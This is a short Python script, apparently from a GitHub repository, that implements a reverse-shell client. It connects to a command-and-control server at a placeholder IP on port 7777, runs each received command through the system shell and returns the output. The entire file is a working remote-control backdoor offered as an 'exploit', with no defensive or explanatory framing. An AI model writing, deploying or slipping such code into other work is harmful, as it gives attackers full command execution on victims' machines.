#To run the exploit make sure you installed the requirments from the requirements
#------------------------------------------------------------GiThUb RohitRamCharan777-----------------------------------------------------------------------
import threading
import socket
import subprocess

server_ip="ip"
server_port=7777
client_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_ip,server_port))
while True:
    try:
        commands=client_socket.recv(1024).decode()
        print(f"command received from c2 {commands}")
        if commands=="exit":
            break
        try:
            output_to_send=subprocess.check_output(commands,shell=True,stderr=subprocess.STDOUT,text=True)
        except subprocess.CalledProcessError as e:
            output_to_send=e.output

        if not output_to_send:
            output_to_send="Command ececuted but no output"

        print(f"sending output: {output_to_send}")
        client_socket.send(output_to_send.encode())
    except ConnectionResetError:
        print("Connection error please retry")
        break
client_socket.close()
